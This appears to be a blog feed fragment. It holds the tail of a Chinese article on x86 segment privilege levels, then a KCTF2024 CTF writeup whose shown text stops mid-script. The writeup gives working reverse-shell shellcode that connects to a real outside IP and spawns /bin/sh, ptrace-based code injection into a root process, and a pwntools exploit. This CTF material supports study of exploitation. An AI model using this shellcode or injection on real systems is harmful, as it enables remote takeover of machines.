位和 32 位的一个区分。</li><li>DPL位：规定了访问这个段所需的权限。通常来说，当你的权限 &lt;&#x3D; 段权限时，访问才是允许的（这里数值越小，权限越高）。</li><li>AVL位：AVL指示是否可供系统软件使用，由操作系统来使用。</li></ul><p>也来看看 D 位的区别：</p><img src="/2024/09/17/x86_1/7.png" class=""><p>红色表示向下拓展能寻址的范围。可以看出，如果<code>D = 0</code>，就算原来能寻址<code>4GB</code>，因为DB位的限制导致最大范围是<code>64KB</code>。</p><h3 id="段权限"><a href="#段权限" class="headerlink" title="段权限"></a>段权限</h3><p>其实前面介绍的已经比较完整了，段权限被存储在两个位置，一个是<strong>段选择子</strong>，一个是<strong>段描述符</strong>，但是这里要介绍三种权限等级。</p><ol><li>当前特权级（CPL，Current Privilege Level），存储在代码段寄存器（段选择子）的低2位，表示了当前进程的特权等级。</li><li>请求特权级（RPL，Request Privilege Level），存储在其它段寄存器的低2位。表明了访问这个段所使用的权限。</li><li>段描述符特权级（DPL，Descriptor Privilege Level），存储在段描述符中，表明了访问这个段所需的特权等级。</li></ol><p>这里可能会对 RPL 和 DPL 有所分不清，想着这俩不都是对同一个段的描述么，为什么还要进行区分。这里需要说明，两个的区别，DPL表示了，你访问这个段最少需要多少的权限。RPL 则指示了，我访问这个段通过什么权限去访问。</p><p>比如一个 ring0 的程序，它的特权等级显然是 0，但是它要去访问一个低权限的段可以不用这么高的权限，我可以只使用 ring3 的权限，所以我只需要修改一下我请求的这个段的 RPL 就可以更改我访问的权限而不必修改自身的权限（CPL）。</p><p>这里再举一个通俗易懂的例子：</p><p>正国级（0），正部级（1），正厅级（2），正处级（3）。它们所能管辖的范围也有所不同，对应的分别是全国（0），省级（1），市级（2），县级（3）。CPL就相当于你个人的职级，行政单位的权限就相当于段特权等级（DPL）。RPL在里面就有点意思了，它不随前两个变化，随你心意。你身为省长，想去一个县里面的单位视察肯定没有问题，但是问题来了，你要以什么身份去视察呢？这个身份，就是你去视察的地方所使用的特权等级（RPL）。显而易见的，你所使用的请求特权等级，必须低于或者等于你自身的身份。因为大官冒充小官，说好听点叫微服私访，而小官冒充大官就涉嫌招摇撞骗了。</p><p>同样的，判断你能不能访问一个段，需要做两方面的检查，第一，判断你级别够不够，第二，判断你有没有招摇撞骗。即，在访问一个段时，作两个检查</p><ol><li>RPL&lt;&#x3D;DPL（判断级别够不够）</li><li>CPL&lt;&#x3D;RPL（判断是否招摇撞骗）</li></ol><p>如果都通过了，说明你是可以访问这个段的，否则就会引发段错误。</p><h3 id="一致性与非一致性"><a href="#一致性与非一致性" class="headerlink" title="一致性与非一致性"></a>一致性与非一致性</h3><ul><li>对于一致代码段:也就是共享的段.<ol><li>特权级高的程序不允许访问特权级低的数据:核心态不允许调用用户态的数据.</li><li>特权级低的程序可以访问到特权级高的数据.但是特权级不会改变:用户态还是用户态.</li></ol></li><li>对于普通代码段.也就是非一致代码段:<ol><li>只允许同级间访问.</li><li>绝对禁止不同级访问:核心态不用用户态.用户态也不使用核心态.</li></ol></li><li>对于数据段来说高特权允许访问低特权的数据而不允许低特权访问高特权的数据。</li></ul><p>总结：</p><p>非一致代码段只允许同级访问。</p><p>对于一致性的段，一般情况下认为内核代码是完善的，不容易出错的，用户层的代码是不完善的，极容易出错的。因此允许用户调用内核提供的代码，而不允许内核调用用户的代码。</p><p>对于一致性的数据段，一般情况下认为内核的数据很私密，不能够随便让应用程序读取。而操作系统对用户的数据应当有知情权，不论是为了调试还是管理，都应当有知情权。</p><p>可以总结出以下表</p><table><thead><tr><th></th><th>向高特权请求</th><th>向低特权请求</th><th>同级请求</th><th>适用性</th></tr></thead><tbody><tr><td>一致代码段</td><td>Y</td><td>N</td><td>Y</td><td>共享库函数，暴漏的内核接口</td></tr><tr><td>非一致代码段</td><td>N</td><td>N</td><td>Y</td><td>避免低特权级的程序执行的代码</td></tr><tr><td>数据段</td><td>N</td><td>Y</td><td>Y</td><td>*</td></tr></tbody></table><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>（注：引用不分先后）</p><ul><li>[1]：<a href="https://www.cnblogs.com/johnnyflute/p/3564894.html">https://www.cnblogs.com/johnnyflute/p/3564894.html</a></li><li>[2]：<a href="https://zh.wikipedia.org/wiki/X86%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5">https://zh.wikipedia.org/wiki/X86記憶體區段</a></li><li>[3]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_1</a></li><li>[4]：<a href="https://www.cnblogs.com/wingsummer/p/15312627.html">https://www.cnblogs.com/wingsummer/p/15312627.html</a></li></ul>]]></content>
    
    
    <summary type="html">重新把内核基础学一遍，方便后续学习的展开。</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    <category term="X86" scheme="https://xia0ji233.github.io/categories/X86/"/>
    
    <category term="Protected_Mode" scheme="https://xia0ji233.github.io/categories/X86/Protected-Mode/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>KCTF2024第八题 writeup</title>
    <link href="https://xia0ji233.github.io/2024/09/02/KCTF2024/"/>
    <id>https://xia0ji233.github.io/2024/09/02/KCTF2024/</id>
    <published>2024-09-02T12:00:00.000Z</published>
    <updated>2024-09-02T14:16:04.405Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2024第八题——星门 writeup</p><span id="more"></span><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>拿到题目，是一道典型的写shellcode的题目，白名单系统调用，只允许 read，wait4 和 ptrace。</p><img src="/2024/09/02/KCTF2024/1.png" class=""><p>沙箱系统调用号白名单首先想到了切架构，但是它题目也有判断架构。因此就只能利用这个 ptrace 去做文章了。</p><p>其次应当考虑信息以何种方式回传，因为原进程是连write都不能用的，侧信道也没法，所以便起了一个docker环境去试试。发现启动脚本中。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure><p>​于是选择让队友先起一个docker环境，然后观察里面可以使用的进程。</p><img src="/2024/09/02/KCTF2024/2.png" class=""><p>发现了进程 <code>sleep infinity</code>，并且占用的 pid 始终保持 20 以内，并且脚本启动就是 root 权限，不用担心附加不上的问题。</p><p>最后要去尝试的一点就是该靶机是否出网，静态编译一个 socket 请求对外连接发现完全可行，因此考虑反弹 shell。</p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>于是开始着手写 shellcode，先写可以反弹shell的shellcode，这个shellcode是我们要注入到目标进程的。这里为了保证shellcode正确，先编译一个 demo 尝试。</p><p>反弹 shell 用汇编去描述其实也非常简单。首先，反弹shell的步骤如下：</p><ol><li>起一个socket套接字</li><li>连接远程服务器</li><li>将标准输入，标准输出，标准错误描述符都重定向到这个套接字描述符。</li><li>execve 运行一个 shell 程序。</li></ol><p>这四个步骤分别可以对应</p><ol><li>socket</li><li>connect</li><li>dup2</li><li>execve</li></ol><p>这四个系统调用，稍微了解一下，把参数一传，就可以达到反弹 shell 的目的。</p><p>最终我的 shellcode 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x30</span><br><span class="line">mov eax,1</span><br><span class="line">syscall</span><br><span class="line">/*socket(AF_INET,SOCK_STREAM,0)*/</span><br><span class="line">mov edi,2</span><br><span class="line">mov esi,1</span><br><span class="line">mov edx,0</span><br><span class="line">mov eax,41</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=0) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=1) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=2) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 2</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span><br><span class="line">/* push b&#x27;/bin/sh\x00&#x27; */</span><br><span class="line">mov rax, 0x101010101010101</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span><br><span class="line">xor [rsp], rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>其中 dup2 和 execve 都可以用 shellcraft 生成，socket 和 connect 需要自己配参数，因为你搜网上的教程大概率都是用一堆的宏。shellcraft 似乎不支持这个，所以需要手动去看看那些宏的值是多少。</p><p>至于 <code>0xe14e2b650f270002</code> 这个数怎么来的，可以直接 C 编译出去再看看的，C语言的写法是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddr</span>;</span></span><br><span class="line"><span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//TCP listen</span></span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">serverAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;101.43.78.225&quot;</span>);</span><br><span class="line">connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverAddr, <span class="keyword">sizeof</span>(serverAddr))</span><br></pre></td></tr></table></figure><p>编译，gdb调试</p><img src="/2024/09/02/KCTF2024/3.png" class=""><p>得到对应 <code>ip port</code> 的 <code>serverAddr</code> 的值。</p><p>这里需要注意的是，<code>connect</code> 中间需要构造一个 16 字节大小的结构体，然后传指针进去。这里一开始会比较头疼，因为你可能苦于没有确定可写的地址，但是后面想到 rsp 和 rbp 所指向的值通常是可写的，就往里面去写，然后把 rbp 作为这里的第二个参数。</p><p>然后就能得到手搓的 connect 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>将代码注入一个 demo 进程，反弹 shell 成功</p><img src="/2024/09/02/KCTF2024/4.png" class=""><h3 id="注入进程"><a href="#注入进程" class="headerlink" title="注入进程"></a>注入进程</h3><p>随后我们需要写一个可以利用 ptrace 将代码注入到另一个进程的 shellcode。</p><p>这里把上面编译好的 shellcode 放到  + 0x200 的位置上，方便做循环，然后开始编写注入代码，这里本地调试就假设我们已知我们要注入的进程的 pid。</p><p>这里可以写一个被注入进程的 demo。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关 ptrace 的解析，可以看我这一篇<a href="https://xia0ji233.pro/2023/12/03/Ptrace/">文章</a>。首先我们要用 <code>PTRACE_ATTACH</code> 去附加这个进程，这里有一点很坑的地方是，它的第四个参数貌似不是 rcx 是 r10，并且用 shellcraft 生成也是这样，所以我在原有的基础上会加一句 <code>mov r10,rcx</code>。</p><p>所以第一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*save mmap start addr*/</span><br><span class="line">push rdx</span><br><span class="line">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span><br><span class="line">mov edi,0x10/*ATTACH*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rcx,0</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>第一句是因为调用入口时 <code>call rdx</code> 因此这里先保存 mmap 分配的地址，方便给下面的寄存器使用。</p><p>第二步，因为在 ptrace 附加完成之后，进程会被阻塞，所以我们可以趁这个时机将 RIP 后面的代码布置成我们上面编写的 shellcode。所以这一步需要获取 RIP 的值。</p><p>ptrace 有获取寄存器的选项，<code>ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);</code></p><p>第四个参数是指针，我们随便给一个内存区域即可，这里我用了 +0x800 的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov edi,0xc /*GETREGS*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x800</span><br><span class="line">mov r10,rcx</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来是获取当前目标进程 RIP 的值，这里可以直接看结构体定义算偏移，也可以直接 gdb 起一个看看偏移，实际它在结构体的偏移是 +0x80。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x880</span><br><span class="line">mov rdx,[rcx]</span><br><span class="line">/*RIP offset*/</span><br></pre></td></tr></table></figure><p>接下来就用汇编写一个循环，ptrace 一次读写内存都是 8 个字节，并且需要注意的是，在写数据的时候，第四个参数不作为指针，而是直接作为一个字的数据被写入。</p><p>最后一点需要注意的是，shellcode 写入完成之后，要主动让进程脱离调试器，如果不管的话附加的进程死亡会导致被附加的进程一起死亡，shellcode不一定能被执行。</p><p>本地调试的时候可能会有一点麻烦，如果进程异常退出基本很难查到问题所在，因为一个进程不能同时被两个进程调试，因此我们需要调试附加的进程，每一次 ptrace 调用时查看返回值是否 &lt;0，我遇到的比较多的是返回 -5，当时是一个内存写入错误，仔细一查发现是汇编代码写错了一个，导致取到了错误的地址。</p><h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;usage: exp.py pid&#x27;</span>)</span><br><span class="line">    quit()</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">serveraddr=[<span class="number">0xe14e2b650f270002</span>,<span class="number">0x0000000000000064</span>]</span><br><span class="line"><span class="comment">#server struct</span></span><br><span class="line"><span class="comment">#target ip: 101.43.78.225:9999</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./test&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.101.191.23&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment">#addr=int(p.recv(12),16)</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x7f0000000000</span></span><br><span class="line">inject_shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*socket(AF_INET,SOCK_STREAM,0)*/</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,2</span></span><br><span class="line"><span class="string">mov esi,1</span></span><br><span class="line"><span class="string">mov edx,0</span></span><br><span class="line"><span class="string">mov eax,41</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r14,0xe14e2b650f270002</span></span><br><span class="line"><span class="string">mov r15,0x64</span></span><br><span class="line"><span class="string">mov r12,rsp</span></span><br><span class="line"><span class="string">mov [r12],r14</span></span><br><span class="line"><span class="string">mov [r12+8],r15</span></span><br><span class="line"><span class="string">mov r13,r12</span></span><br><span class="line"><span class="string">/*connect(sockfd,serveraddr,16)*/</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,r13</span></span><br><span class="line"><span class="string">mov edx,16</span></span><br><span class="line"><span class="string">mov eax,42</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=0) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=1) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=2) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span></span><br><span class="line"><span class="string">/* push b&#x27;/bin/sh\x00&#x27; */</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call execve() */</span></span><br><span class="line"><span class="string">push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(len(asm(inject_shellcode)))</span></span><br><span class="line">inject_shellbytes=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">6</span>+asm(inject_shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;inject_shellcode: &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(inject_shellbytes)))</span><br><span class="line">pid=sys.argv[<span class="number">1</span>]</span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*save mmap start addr*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">mov edi,0x10/*ATTACH*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rcx,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test ax,ax</span></span><br><span class="line"><span class="string">jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,0xc /*GETREGS*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">add rcx,0x800</span></span><br><span class="line"><span class="string">mov r10,rcx</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push 